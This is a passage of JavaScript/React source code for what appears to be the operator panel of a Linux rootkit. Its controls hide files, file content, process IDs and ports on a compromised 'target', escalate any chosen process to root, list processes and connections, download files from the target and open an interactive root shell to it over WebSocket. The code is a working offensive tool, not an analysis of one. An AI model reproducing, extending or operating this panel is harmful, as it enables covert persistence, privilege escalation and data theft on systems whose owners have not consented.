                            onClick={() => {
                              if (isDir) { navigateTo(entry.name) }
                              else if (sel) { setSelected(null); setPreview(null) }
                              else { setSelected(entry.name); doPreview(fullPath) }
                            }}
                          >
                            {isDir
                              ? <Folder size={28} className="text-amber" />
                              : isLink
                                ? <FileText size={28} className="text-blue" />
                                : <FileText size={28} className="text-fg-3" />}
                            <span className={`font-mono text-[11px] text-center w-full truncate ${isDir ? 'font-bold' : ''} ${isLink ? 'italic text-fg-2' : ''}`}>
                              {entry.name}
                            </span>
                            {!isDir && (
                              <span className="font-mono text-[9px] text-fg-3 tabular-nums">{formatSize(entry.size)}</span>
                            )}
                            {!isDir && (
                              <div className="flex gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
                                <button className="nb-btn p-1 text-[9px]" title="Preview" onClick={e => { e.stopPropagation(); doPreview(fullPath) }} disabled={busy}>
                                  <Eye size={10} />
                                </button>
                                <button
                                  className={`nb-btn p-1 text-[9px] ${h ? '!bg-green !text-white' : ''}`}
                                  title={h ? 'Unhide' : 'Hide'}
                                  onClick={e => { e.stopPropagation(); cmd(h ? `UNHIDE FILE ${entry.name}` : `HIDE FILE ${entry.name}`) }}
                                  disabled={!t.online || busy}
                                >
                                  <Shield size={10} />
                                </button>
                              </div>
                            )}
                          </div>
                        )
                      })}
                    </div>
                  )
                ) : (
                  <div className="flex flex-col items-center justify-center gap-2 p-12 text-fg-3">
                    <Folder size={24} />
                    <span className="text-sm font-bold">Empty directory</span>
                  </div>
                )}
              </div>
            </div>

            {/* Preview side panel */}
            {preview && (
              <PreviewPanel
                preview={preview}
                onClose={() => { setPreview(null); setSelected(null) }}
                onHideContent={pattern => {
                  const lines = pattern.split('\n').map(l => l.trim()).filter(Boolean)
                  for (const line of lines) cmd(`HIDE CONTENT ${line}`)
                }}
                onHideFile={() => cmd(`HIDE FILE ${preview.path.split('/').pop()}`)}
                online={t.online && !busy}
              />
            )}
          </div>

          {/* Status bar */}
          <div className="flex items-center justify-between px-4 py-2 border-t-2 border-border bg-bg-2">
            <span className="font-mono text-[11px] text-fg-3 tabular-nums font-bold">
              {sorted.length} item{sorted.length !== 1 ? 's' : ''}
              {selected && <> &middot; <span className="text-fg-2">{selected}</span></>}
              {snap.loading && <> &middot; <span className="text-main">loading</span></>}
            </span>
            <div className="flex items-center gap-2">
              {selected && (
                <button className="nb-btn px-2.5 py-0.5 text-[11px] flex items-center gap-1.5"
                  onClick={() => cmd(`HIDE FILE ${selected}`)}
                >
                  <EyeOff size={11} /> Hide
                </button>
              )}
            </div>
          </div>
        </>
      ) : (
        <div className="flex-1 overflow-auto">
          <HiddenSummary title="Hidden Files" icon={FileText} items={hiddenFiles}
            onRemove={i => cmd(`UNHIDE FILE ${i}`)} onAdd={v => cmd(`HIDE FILE ${v}`)} placeholder="/etc/secret.conf" />
          <HiddenSummary title="Hidden Content" icon={Search} items={hiddenContent}
            onRemove={i => cmd(`UNHIDE CONTENT ${i}`)} onAdd={v => cmd(`HIDE CONTENT ${v}`)} placeholder="rootkit" />
        </div>
      )}
    </div>
  )
}

export function DownloadOverlay({ downloads, setDownloads, targetId, targets }) {
  const [open, setOpen] = useState(false)
  const allEntries = Object.entries(downloads)
  const entries = allEntries
  const active = entries.filter(([, dl]) => dl.state === 'pending').length
  const done = entries.filter(([, dl]) => dl.state === 'done').length
  const total = entries.length
  const targetLabel = (id) => {
    const t = targets?.find(t => t.id === id)
    return t?.label || id
  }

  useEffect(() => {
    if (total > 0 && !open) setOpen(true)
  }, [total])

  if (!total) return null

  const dismiss = (key) => setDownloads(s => { const n = { ...s }; delete n[key]; return n })
  const clearDone = () => setDownloads(s => {
    const n = {}
    for (const [k, v] of Object.entries(s)) {
      if (v.state !== 'done' && v.state !== 'error') n[k] = v
    }
    return n
  })
  const save = (key, dl) => {
    const blob = new Blob([dl.raw], { type: 'application/octet-stream' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = dl.path.split('/').pop() || 'download'
    a.click()
    setTimeout(() => URL.revokeObjectURL(url), 1000)
    dismiss(key)
  }

  return (
    <div className="fixed bottom-4 right-4 z-50 flex flex-col items-end gap-2">
      {/* Expanded drawer */}
      {open && (
        <div className="border-2 border-border rounded-[var(--radius)] bg-bg shadow-[var(--shadow-offset)_var(--shadow-offset)_0px_0px_var(--color-border)] w-[320px] flex flex-col max-h-[360px]">
          {/* Drawer header */}
          <div className="flex items-center justify-between px-3 py-2 border-b-2 border-border bg-bg-2 shrink-0">
            <div className="flex items-center gap-2">
              <Download size={13} className="text-main" />
              <span className="text-xs font-bold">Downloads</span>
              {active > 0 && <span className="nb-badge bg-main text-main-fg text-[9px] py-0 px-1.5">{active} active</span>}
            </div>
            <div className="flex items-center gap-1">
              {done > 0 && (
                <button className="text-[10px] text-fg-3 hover:text-fg font-bold px-1.5" onClick={clearDone}>
                  Clear done
                </button>
              )}
              <button className="p-0.5 text-fg-3 hover:text-fg" onClick={() => setOpen(false)}>
                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M3 4.5L6 7.5L9 4.5"/></svg>
              </button>
            </div>
          </div>
          {/* Queue */}
          <div className="overflow-auto flex-1 divide-y divide-border/50">
            {entries.map(([key, dl]) => {
              const name = dl.path.split('/').pop()
              const pct = dl.state === 'pending' && dl.total ? Math.round(dl.received * 100 / dl.total) : 0
              return (
                <div key={key} className="px-3 py-2.5 hover:bg-bg-2 transition-colors">
                  <div className="flex items-center gap-2 mb-1">
                    {dl.state === 'pending' && <Loader size={11} className="animate-spin text-main shrink-0" />}
                    {dl.state === 'done' && <CheckCircle size={11} className="text-green shrink-0" />}
                    {dl.state === 'error' && <AlertCircle size={11} className="text-red shrink-0" />}
                    <div className="flex flex-col min-w-0 flex-1">
                      <span className="font-mono text-[11px] font-bold truncate">{name}</span>
                      <span className="text-[9px] text-fg-3 truncate">{targetLabel(dl.targetId)} : {dl.path}</span>
                    </div>
                    <button className="p-0.5 text-fg-3 hover:text-fg shrink-0 opacity-0 hover:opacity-100" onClick={() => dismiss(key)}>
                      <X size={10} />
                    </button>
                  </div>
                  {dl.state === 'pending' && (
                    <div className="flex flex-col gap-1">
                      <div className="flex items-center gap-2">
                        <div className="h-1.5 bg-bg-2 border border-border/50 rounded-full overflow-hidden flex-1">
                          <div className="h-full bg-main transition-all duration-300" style={{ width: dl.total ? `${pct}%` : '30%' }} />
                        </div>
                        <span className="text-[9px] text-fg-3 font-mono tabular-nums shrink-0">
                          {dl.total ? `${pct}%` : '...'}
                        </span>
                      </div>
                      {dl.total > 0 && (
                        <span className="text-[9px] text-fg-3 font-mono tabular-nums">
                          {formatSize(dl.received)} / {formatSize(dl.total)}
                        </span>
                      )}
                    </div>
                  )}
                  {dl.state === 'done' && (
                    <div className="flex items-center gap-1.5 mt-0.5">
                      <span className="text-[10px] text-fg-3 font-mono">{formatSize(dl.size)}</span>
                      <button className="nb-btn px-1.5 py-0 text-[9px] flex items-center gap-1 ml-auto"
                        onClick={() => setDownloads(s => ({ ...s, [key]: { ...s[key], showPreview: true } }))}
                      >
                        <Eye size={9} /> Preview
                      </button>
                      <button className="nb-btn px-1.5 py-0 text-[9px] flex items-center gap-1" onClick={() => save(key, dl)}>
                        <Download size={9} /> Save
                      </button>
                    </div>
                  )}
                  {dl.state === 'error' && (
                    <span className="text-[9px] text-red font-bold" title={dl.error || ''}>Failed{dl.error ? `: ${dl.error}` : ''}</span>
                  )}
                </div>
              )
            })}
          </div>
        </div>
      )}

      {/* Collapsed pill */}
      {!open && total > 0 && (
        <button
          className="nb-btn px-3 py-2 flex items-center gap-2 text-xs font-bold"
          onClick={() => setOpen(true)}
        >
          <Download size={13} className={active > 0 ? 'text-main' : 'text-green'} />
          {active > 0
            ? <><span>{active} downloading</span>{done > 0 && <span className="text-fg-3">, {done} done</span>}</>
            : <span>{total} download{total !== 1 ? 's' : ''}</span>}
          <svg width="10" height="10" viewBox="0 0 10 10" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M2 6l3-3 3 3"/></svg>
        </button>
      )}
    </div>
  )
}

export function PreviewModal({ downloads, setDownloads }) {
  const entry = Object.entries(downloads).find(([, dl]) => dl.showPreview)
  useEffect(() => {
    if (!entry) return
    const handler = (e) => { if (e.key === 'Escape') setDownloads(s => ({ ...s, [entry[0]]: { ...s[entry[0]], showPreview: false } })) }
    window.addEventListener('keydown', handler)
    return () => window.removeEventListener('keydown', handler)
  }, [entry, setDownloads])
  if (!entry) return null
  const [path, dl] = entry
  const { type, content } = formatPreview(dl.raw, path)
  const name = path.split('/').pop()
  const close = () => setDownloads(s => ({ ...s, [path]: { ...s[path], showPreview: false } }))
  const save = () => {
    const blob = new Blob([dl.raw], { type: 'application/octet-stream' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = name || 'download'
    a.click()
    setTimeout(() => URL.revokeObjectURL(url), 1000)
  }
  return (
    <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/40" onClick={close}>
      <div className="nb-card bg-bg w-full max-w-2xl max-h-[80vh] flex flex-col m-4" onClick={e => e.stopPropagation()}>
        <div className="flex items-center justify-between px-5 py-3 border-b-2 border-border bg-bg-2 shrink-0">
          <div className="flex items-center gap-2.5 min-w-0">
            <FileText size={16} className="text-fg-3 shrink-0" />
            <span className="font-mono text-sm font-bold truncate">{name}</span>
            <span className="font-mono text-xs text-fg-3 shrink-0">{formatSize(dl.size)}</span>
            {type === 'binary' && <span className="nb-badge bg-amber text-white text-[9px] py-0 px-1.5 shrink-0">binary</span>}
          </div>
          <div className="flex items-center gap-2 shrink-0">
            <button className="nb-btn px-3 py-1.5 text-xs flex items-center gap-1.5" onClick={save}>
              <Download size={12} /> Save
            </button>
            <button className="nb-btn p-1.5" onClick={close}>
              <X size={14} />
            </button>
          </div>
        </div>
        <pre className="px-5 py-4 text-sm font-mono text-fg-2 whitespace-pre-wrap break-all overflow-auto flex-1">{content}</pre>
      </div>
    </div>
  )
}

function HiddenSummary({ title, icon: Icon, items, onRemove, onAdd, placeholder }) {
  const [val, setVal] = useState('')
  const submit = () => { if (val.trim()) { onAdd(val.trim()); setVal('') } }

  return (
    <div className="border-b-2 border-border">
      <div className="flex items-center justify-between px-4 py-3 bg-bg-2">
        <div className="flex items-center gap-2">
          <Icon size={16} className="text-fg-3" />
          <span className="text-sm font-bold uppercase tracking-wider">{title}</span>
          <span className="nb-badge bg-main text-main-fg">{items.length}</span>
        </div>
        <div className="flex items-center gap-2">
          <input className="nb-input px-3 py-1.5 text-sm w-44" placeholder={placeholder}
            value={val} onChange={e => setVal(e.target.value)} onKeyDown={e => e.key === 'Enter' && submit()} />
          <button className="nb-btn px-3 py-1.5 text-sm" onClick={submit}>+ Add</button>
        </div>
      </div>
      {items.length ? items.map((v, i) => (
        <div key={i} className="flex items-center justify-between px-4 py-2.5 border-t-2 border-border hover:bg-bg-2 group">
          <div className="flex items-center gap-3">
            <span className="text-sm font-mono text-fg-3 w-6">{i}</span>
            <span className="font-mono text-sm">{v}</span>
          </div>
          <button className="text-sm font-bold text-red opacity-0 group-hover:opacity-100 hover:underline"
            onClick={() => onRemove(i)}>remove</button>
        </div>
      )) : (
        <div className="px-4 py-6 text-center text-fg-3 border-t-2 border-border">None</div>
      )}
    </div>
  )
}

/* -- Snapshot bar (shared) ----------------------------------- */

function SnapshotBar({ title, icon: Icon, count, hiddenCount, time, loading, onSnapshot, online, children }) {
  const ago = time ? timeAgo(time) : null
  return (
    <div className="flex items-center gap-2 px-4 py-2 border-b-2 border-border bg-bg-2">
      {Icon && <Icon size={14} className="text-fg-3" />}
      <span className="text-sm font-bold uppercase tracking-wide">{title}</span>
      {count > 0 && <span className="nb-badge bg-main text-main-fg">{count}</span>}
      {hiddenCount > 0 && <span className="nb-badge bg-red text-white">{hiddenCount} hidden</span>}
      {children}
      <div className="ml-auto flex items-center gap-2">
        {ago && (
          <span className="text-[11px] text-fg-3 flex items-center gap-1 tabular-nums">
            <Clock size={10} /> {ago}
          </span>
        )}
        <button className="nb-btn p-1.5" onClick={onSnapshot} disabled={!online || loading} title="Refresh snapshot">
          <RefreshCw size={14} className={loading ? 'animate-spin' : ''} />
        </button>
      </div>
    </div>
  )
}

function EmptySnapshotCta({ icon: Icon, title, subtitle, onCapture, online, loading }) {
  return (
    <div className="flex-1 flex items-center justify-center h-full">
      <div className="text-center px-6 py-10">
        <div className="mx-auto w-16 h-16 rounded-[var(--radius)] border-2 border-border bg-main/10 flex items-center justify-center mb-5 shadow-[3px_3px_0px_0px_var(--color-border)]">
          <Icon size={28} className="text-main" />
        </div>
        <div className="text-lg font-bold mb-1">{title}</div>
        <div className="text-sm text-fg-3 mb-6 max-w-xs">{subtitle}</div>
        <button className="nb-btn-main px-6 py-2.5 text-sm font-bold flex items-center gap-2 mx-auto" onClick={onCapture} disabled={!online || loading}>
          {loading ? <Loader size={16} className="animate-spin" /> : <Radio size={16} />}
          {loading ? 'Scanning...' : 'Capture Snapshot'}
        </button>
      </div>
    </div>
  )
}

function timeAgo(date) {
  const s = Math.floor((Date.now() - date.getTime()) / 1000)
  if (s < 5) return 'just now'
  if (s < 60) return `${s}s ago`
  if (s < 3600) return `${Math.floor(s / 60)}m ago`
  return date.toLocaleTimeString()
}

/* -- Processes ----------------------------------------------- */

const PS_CMD = "for d in /proc/[0-9]*; do u=$(stat -c %u \"$d\" 2>/dev/null); cat \"$d/stat\" 2>/dev/null | sed \"s/^/$u /\"; done"

function ProcsTab({ target: t, cmd, query, execCmd, busy }) {
  const snap = useSnapshot(`procs:${t.id}`)
  const [filter, setFilter] = useState('')
  const [panel, setPanel] = useState('scan')
  const [escPid, setEscPid] = useState('')
  const [escStatus, setEscStatus] = useState(null)
  const hiddenPids = t.hidden?.pid || []

  const capture = useCallback(() => {
    snap.setLoading(true)
    execCmd(PS_CMD, t.id).then(r => {
      if (r.ok) {
        const parsed = r.output.split('\n').filter(Boolean).map(line => {
          const m = line.match(/^(\d+)\s+(\d+)\s+\((.+?)\)\s+(\S+)\s+(\d+)/)
          if (!m) return null
          return { uid: m[1], pid: m[2], comm: m[3], stat: m[4], ppid: m[5] }
        }).filter(Boolean)
        snap.set(parsed)
      } else {
        snap.fail(r.output || 'failed')
      }
    })
  }, [execCmd, t.id, snap])

  const doEscalate = useCallback((pid) => {
    setEscStatus('pending')
    query(`ESCALATE ${pid}`, t.id).then(r => {
      setEscStatus(r.ok ? 'ok' : 'error')
      if (r.ok) setEscPid('')
      setTimeout(() => { setEscStatus(null); capture() }, 1500)
    })
  }, [query, t.id, capture])

  const procs = snap.data || []
  const filtered = filter
    ? procs.filter(p => p.comm.includes(filter) || p.pid === filter || p.ppid === filter || p.uid === filter)
    : procs

  if (!snap.time && !snap.loading)
    return <EmptySnapshotCta icon={Activity} title="Processes"
      subtitle="Scan /proc for running processes on the target"
      onCapture={capture} online={t.online && !busy} loading={snap.loading} />

  return (
    <div className="flex flex-col h-full">
      <SnapshotBar title="Processes" icon={Activity} count={procs.length} hiddenCount={hiddenPids.length}
        time={snap.time} loading={snap.loading} onSnapshot={capture} online={t.online && !busy}>
        <input className="nb-input px-3 py-1 text-sm w-40 ml-2" placeholder="filter..."
          value={filter} onChange={e => setFilter(e.target.value)} />
        <div className="flex border-2 border-border rounded-[var(--radius)] overflow-hidden shrink-0 ml-2">
          <button
            className={`px-3 py-1 text-sm font-bold ${panel === 'scan' ? 'bg-main text-main-fg' : 'hover:bg-bg'}`}
            onClick={() => setPanel('scan')}
          >Scan</button>
          <button
            className={`px-3 py-1 text-sm font-bold border-l-2 border-border ${panel === 'hidden' ? 'bg-main text-main-fg' : 'hover:bg-bg'}`}
            onClick={() => setPanel('hidden')}
          >Hidden {hiddenPids.length}</button>
        </div>
      </SnapshotBar>
      {panel === 'scan' ? (
        <>
          {snap.error && (
            <div className="p-6 text-center">
              <div className="text-red font-bold mb-1">Scan failed</div>
              <div className="text-sm text-fg-3">{snap.error.includes('ticket') || snap.error.includes('busy')
                ? 'Close the active shell session first, then retry.'
                : snap.error}</div>
            </div>
          )}
          {!snap.error && !filtered.length && !snap.loading ? (
            <div className="flex-1 flex items-center justify-center text-fg-3 text-sm">
              {procs.length ? 'No matches' : 'No processes found'}
            </div>
          ) : !snap.error && filtered.length > 0 && (
          <div className="flex-1 overflow-auto">
            <table className="w-full text-sm">
              <thead className="sticky top-0 bg-secondary border-b-2 border-border">
                <tr><Th>PID</Th><Th>User</Th><Th>PPID</Th><Th>State</Th><Th>Command</Th><Th></Th></tr>
              </thead>
              <tbody>
                {filtered.map(p => {
                  const isHidden = hiddenPids.includes(p.pid)
                  const isRoot = p.uid === '0'
                  return (
                    <tr key={p.pid} className={`border-b border-border hover:bg-bg-2 group ${isHidden ? 'opacity-40' : ''}`}>
                      <td className="px-4 py-2 font-mono">{p.pid}</td>
                      <td className={`px-4 py-2 font-mono ${isRoot ? 'text-red font-bold' : 'text-fg-3'}`}>{isRoot ? 'root' : p.uid}</td>
                      <td className="px-4 py-2 font-mono text-fg-3">{p.ppid}</td>
                      <td className="px-4 py-2 font-mono">{p.stat}</td>
                      <td className="px-4 py-2 font-mono">{p.comm}</td>
                      <td className="px-4 py-2 text-right flex items-center justify-end gap-1">
                        <button
                          className="p-1 text-fg-3 hover:text-amber opacity-0 group-hover:opacity-100 transition-opacity"
                          title="Escalate to root"
                          onClick={(e) => { e.stopPropagation(); doEscalate(p.pid) }}
                          disabled={!t.online || isRoot || busy}
                        >
                          <Zap size={14} />
                        </button>
                        <button
                          className={`p-1 transition-opacity ${isHidden ? 'text-green opacity-100' : 'text-fg-3 hover:text-red opacity-0 group-hover:opacity-100'}`}
                          title={isHidden ? 'Unhide PID' : 'Hide PID'}
                          onClick={() => {
                            if (isHidden) {
                              const idx = hiddenPids.indexOf(p.pid)
                              if (idx >= 0) cmd(`UNHIDE PID ${idx}`)
                            } else {
                              cmd(`HIDE PID ${p.pid}`)
                            }
                          }}
                        >
                          {isHidden ? <Eye size={14} /> : <EyeOff size={14} />}
                        </button>
                      </td>
                    </tr>
                  )
                })}
              </tbody>
            </table>
          </div>
          )}
          {/* Escalate bar */}
          <div className="flex items-center gap-2 px-4 py-2.5 border-t-2 border-border bg-bg-2">
            <Zap size={14} className="text-amber shrink-0" />
            <span className="text-sm font-bold uppercase tracking-wide text-fg-3">Escalate</span>
            <input className="nb-input px-3 py-1.5 text-sm w-32 font-mono" placeholder="PID"
              value={escPid} onChange={e => setEscPid(e.target.value.replace(/\D/g, ''))}
              onKeyDown={e => e.key === 'Enter' && escPid && doEscalate(escPid)} />
            <button className="nb-btn px-3 py-1.5 text-sm font-bold" disabled={!escPid || !t.online || escStatus === 'pending' || busy}
              onClick={() => doEscalate(escPid)}>
              {escStatus === 'pending' ? 'Escalating...' : 'Root'}
            </button>
            {escStatus === 'ok' && <span className="text-xs font-bold text-green">Escalated</span>}
            {escStatus === 'error' && <span className="text-xs font-bold text-red">Failed</span>}
          </div>
        </>
      ) : (
        <div className="flex-1 overflow-auto">
          <HiddenSummary title="Hidden PIDs" icon={Activity} items={hiddenPids}
            onRemove={i => cmd(`UNHIDE PID ${i}`)} onAdd={v => cmd(`HIDE PID ${v}`)} placeholder="1234" />
        </div>
      )}
    </div>
  )
}

/* -- Ports --------------------------------------------------- */

const PORTS_CMD = "ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null || cat /proc/net/tcp /proc/net/tcp6 2>/dev/null"

function PortsTab({ target: t, cmd, execCmd, busy }) {
  const snap = useSnapshot(`ports:${t.id}`)
  const hiddenPorts = t.hidden?.port || []

  const capture = useCallback(() => {
    snap.setLoading(true)
    execCmd(PORTS_CMD, t.id).then(r => {
      if (r.ok) {
        const lines = r.output.split('\n').filter(Boolean)
        let parsed
        const ssIdx = lines.findIndex(l => l.trim().startsWith('Netid'))
        const netstatIdx = lines.findIndex(l => l.trim().startsWith('Proto'))
        if (ssIdx >= 0) {
          parsed = lines.slice(ssIdx + 1).map(line => {
            const parts = line.trim().split(/\s+/)
            if (parts.length < 5) return null
            const proto = parts[0]
            const state = parts[1]
            const local = parts[4] || ''
            const foreign = parts[5] || ''
            const portMatch = local.match(/:(\d+)$/)
            const port = portMatch ? portMatch[1] : ''
            const procMatch = line.match(/users:\(\("([^"]+)"/)
            return { proto, local, foreign, port, state, proc: procMatch ? procMatch[1] : '-' }
          }).filter(Boolean)
        } else if (netstatIdx >= 0) {
          parsed = lines.slice(netstatIdx + 1).map(line => {
            const parts = line.trim().split(/\s+/)
            if (parts.length < 6) return null
            const local = parts[3] || ''
            const foreign = parts[4] || ''
            const portMatch = local.match(/:(\d+)$/)
            const port = portMatch ? portMatch[1] : ''
            const proc = parts.length >= 7 ? parts[6] : '-'
            return { proto: parts[0], local, foreign, port, state: parts[5], proc }
          }).filter(Boolean)
        } else {
          const TCP_STATES = { '01': 'ESTABLISHED', '02': 'SYN_SENT', '06': 'TIME_WAIT', '0A': 'LISTEN' }
          parsed = lines.filter(l => l.trim() && !l.trim().startsWith('sl')).map(line => {
            const parts = line.trim().split(/\s+/)
            if (parts.length < 4) return null
            const localHex = parts[1] || ''
            const foreignHex = parts[2] || ''
            const parseAddr = (h) => {
              const [aH, pH] = h.split(':')
              if (!pH) return { addr: '?', port: '0' }
              const port = parseInt(pH, 16).toString()
              if (aH.length === 8) {
                const a = parseInt(aH, 16)
                return { addr: `${a & 0xff}.${(a >> 8) & 0xff}.${(a >> 16) & 0xff}.${(a >> 24) & 0xff}`, port }
              }
              if (aH === '00000000000000000000000000000000') return { addr: '::', port }
              if (aH.startsWith('0000000000000000FFFF0000')) {
                const a = parseInt(aH.slice(24), 16)
                return { addr: `${a & 0xff}.${(a >> 8) & 0xff}.${(a >> 16) & 0xff}.${(a >> 24) & 0xff}`, port }
              }
              return { addr: '[' + aH.match(/.{8}/g).map(g => {
                const n = parseInt(g, 16)
                return ((n & 0xff) << 8 | (n >> 8) & 0xff).toString(16)
              }).join(':') + ']', port }
            }
            const loc = parseAddr(localHex)
            const rem = parseAddr(foreignHex)
            const state = TCP_STATES[parts[3]] || parts[3]
            return { proto: 'tcp', local: `${loc.addr}:${loc.port}`, foreign: `${rem.addr}:${rem.port}`, port: loc.port, state, proc: '-' }
          }).filter(Boolean)
        }
        snap.set(parsed)
      } else {
        snap.fail(r.output || 'failed')
      }
    })
  }, [execCmd, t.id, snap])

  const [panel, setPanel] = useState('scan')
  const ports = snap.data || []

  if (!snap.time && !snap.loading)
    return <EmptySnapshotCta icon={Network} title="TCP Connections"
      subtitle="Scan for TCP connections and listeners on the target"
      onCapture={capture} online={t.online && !busy} loading={snap.loading} />

  return (
    <div className="flex flex-col h-full">
      <SnapshotBar title="Listening Ports" icon={Network} count={ports.length} hiddenCount={hiddenPorts.length}
        time={snap.time} loading={snap.loading} onSnapshot={capture} online={t.online && !busy}>
        <div className="flex border-2 border-border rounded-[var(--radius)] overflow-hidden shrink-0 ml-2">
          <button
            className={`px-3 py-1 text-sm font-bold ${panel === 'scan' ? 'bg-main text-main-fg' : 'hover:bg-bg'}`}
            onClick={() => setPanel('scan')}
          >Scan</button>
          <button
            className={`px-3 py-1 text-sm font-bold border-l-2 border-border ${panel === 'hidden' ? 'bg-main text-main-fg' : 'hover:bg-bg'}`}
            onClick={() => setPanel('hidden')}
          >Hidden {hiddenPorts.length}</button>
        </div>
      </SnapshotBar>
      {panel === 'scan' ? (
        <>
          {snap.error && (
            <div className="p-6 text-center">
              <div className="text-red font-bold mb-1">Scan failed</div>
              <div className="text-sm text-fg-3">{snap.error.includes('ticket') || snap.error.includes('busy')
                ? 'Close the active shell session first, then retry.'
                : snap.error}</div>
            </div>
          )}
          {!snap.error && !ports.length && !snap.loading ? (
            <div className="flex-1 flex items-center justify-center text-fg-3 text-sm">
              No listening ports found. Hit Scan to refresh.
            </div>
          ) : !snap.error && ports.length > 0 && (
          <div className="flex-1 overflow-auto">
            <table className="w-full text-sm">
              <thead className="sticky top-0 bg-secondary border-b-2 border-border">
                <tr><Th>Proto</Th><Th>Local Address</Th><Th>Foreign Address</Th><Th>Port</Th><Th>State</Th><Th>Process</Th><Th></Th></tr>
              </thead>
              <tbody>
                {ports.map((p, i) => {
                  const isHidden = hiddenPorts.includes(p.port)
                  return (
                    <tr key={i} className={`border-b border-border hover:bg-bg-2 group ${isHidden ? 'opacity-40' : ''}`}>
                      <td className="px-4 py-2 font-mono text-fg-3">{p.proto}</td>
                      <td className="px-4 py-2 font-mono">{p.local}</td>
                      <td className="px-4 py-2 font-mono text-fg-3">{p.foreign || '-'}</td>
                      <td className="px-4 py-2 font-mono font-bold">{p.port}</td>
                      <td className="px-4 py-2">
                        <span className={`nb-badge text-[9px] py-0 ${p.state === 'LISTEN' ? 'bg-green text-white' : p.state === 'ESTABLISHED' ? 'bg-blue text-white' : 'bg-bg-2'}`}>
                          {p.state}
                        </span>
                      </td>
                      <td className="px-4 py-2 font-mono text-xs text-fg-3">{p.proc || '-'}</td>
                      <td className="px-4 py-2 text-right">
                        <button
                          className={`p-1 transition-opacity ${isHidden ? 'text-green opacity-100' : 'text-fg-3 hover:text-red opacity-0 group-hover:opacity-100'}`}
                          title={isHidden ? 'Unhide port' : 'Hide port'}
                          onClick={() => {
                            if (isHidden) {
                              const idx = hiddenPorts.indexOf(p.port)
                              if (idx >= 0) cmd(`UNHIDE PORT ${idx}`)
                            } else {
                              cmd(`HIDE PORT ${p.port}`)
                            }
                          }}
                        >
                          {isHidden ? <Eye size={14} /> : <EyeOff size={14} />}
                        </button>
                      </td>
                    </tr>
                  )
                })}
              </tbody>
            </table>
          </div>
          )}
        </>
      ) : (
        <div className="flex-1 overflow-auto">
          <HiddenSummary title="Hidden Ports" icon={Network} items={hiddenPorts}
            onRemove={i => cmd(`UNHIDE PORT ${i}`)} onAdd={v => cmd(`HIDE PORT ${v}`)} placeholder="4444" />
        </div>
      )}
    </div>
  )
}

/* -- Shell --------------------------------------------------- */

const ShellTab = forwardRef(function ShellTab({ target: t, onStatusChange, visible }, ref) {
  const termRef = useRef(null)
  const wsRef = useRef(null)
  const xtermRef = useRef(null)
  const [status, setStatus] = useState('idle')
  const prevStatus = useRef(status)
  if (prevStatus.current !== status) {
    prevStatus.current = status
    onStatusChange?.(status)
  }

  const initTerm = useCallback(async () => {
    if (xtermRef.current) return
    const { Terminal } = await import('@xterm/xterm')
    const { FitAddon } = await import('@xterm/addon-fit')
    await import('@xterm/xterm/css/xterm.css')
    const term = new Terminal({
      cursorBlink: true, fontSize: 13,
      fontFamily: 'JetBrains Mono, Fira Code, monospace',
      theme: {
        background: '#1a1028', foreground: '#e2ddf0', cursor: '#a78bfa',
        selectionBackground: '#463960',
        black: '#1a1028', red: '#dc2626', green: '#16a34a', yellow: '#eab308',
        blue: '#7c3aed', magenta: '#a78bfa', cyan: '#22d3ee', white: '#e2ddf0',
      },
    })
    const fitAddon = new FitAddon()
    term.loadAddon(fitAddon)
    if (!termRef.current) { term.dispose(); return }
    term.open(termRef.current)
    fitAddon.fit()
    xtermRef.current = term
    term.onData((data) => {
      if (wsRef.current?.readyState === WebSocket.OPEN) wsRef.current.send(data)
    })
    const ro = new ResizeObserver(() => fitAddon.fit())
    ro.observe(termRef.current)
    term._ro = ro
  }, [])

  const connect = useCallback(async () => {
    if (wsRef.current) return
    setStatus('connecting')
    if (xtermRef.current) xtermRef.current.clear()
    await initTerm()

    const ws = new WebSocket(wsUrl(`/shell?target=${encodeURIComponent(t.id)}`))
    ws.binaryType = 'arraybuffer'
    wsRef.current = ws
    ws.onmessage = (e) => {
      if (typeof e.data === 'string') {
        const msg = JSON.parse(e.data)
        if (msg.type === 'ready') {
          setStatus('connected')
          if (xtermRef.current) xtermRef.current.focus()
        } else if (msg.type === 'error') {
          const isBusy = (msg.msg || '').toLowerCase().includes('busy')
          setStatus(isBusy ? 'busy' : 'error')
          if (xtermRef.current) {
            if (isBusy) {
              xtermRef.current.writeln('\r\n\x1b[33mShell slot is in use (another session is active, possibly from the TUI).\x1b[0m')
              xtermRef.current.writeln('\x1b[33mClose the other shell first, then reconnect.\x1b[0m')
            } else {
              xtermRef.current.writeln(`\r\n\x1b[31m${msg.msg}\x1b[0m`)
            }
          }
        }
      } else if (xtermRef.current) {
        xtermRef.current.write(new Uint8Array(e.data))
      }
    }
    ws.onclose = () => {
      wsRef.current = null
      setStatus(prev => {
        if (prev === 'busy' || prev === 'error') return prev
        if (xtermRef.current) xtermRef.current.writeln('\r\n\x1b[33m[session ended]\x1b[0m')
        return 'disconnected'
      })
    }
    ws.onerror = () => ws.close()
  }, [t.id, initTerm])

  const disconnect = useCallback(() => {
    if (wsRef.current) { wsRef.current.close(); wsRef.current = null }
    setStatus('idle')
  }, [])

  useImperativeHandle(ref, () => ({ disconnect }), [disconnect])

  useEffect(() => () => {
    if (wsRef.current) wsRef.current.close()
    wsRef.current = null
    if (xtermRef.current) {
      if (xtermRef.current._ro) xtermRef.current._ro.disconnect()
      xtermRef.current.dispose()
      xtermRef.current = null
    }
  }, [])

  const active = status === 'connected' || status === 'connecting' || status === 'disconnected' || status === 'error' || status === 'busy'

  return (
    <div className="flex flex-col h-full">
      {active ? (
        <>
          <div className="flex items-center gap-2 px-4 py-2 border-b-2 border-border bg-bg-2">
            <SquareTerminal size={14} className="text-fg-3" />
            <span className="text-sm font-bold uppercase tracking-wide">root@target</span>
            <span className={`inline-block w-2 h-2 rounded-full ${
              status === 'connected' ? 'bg-green-500' :
              status === 'connecting' ? 'bg-yellow-500 animate-pulse' :
              status === 'busy' ? 'bg-amber' :
              'bg-neutral-500'
            }`} />
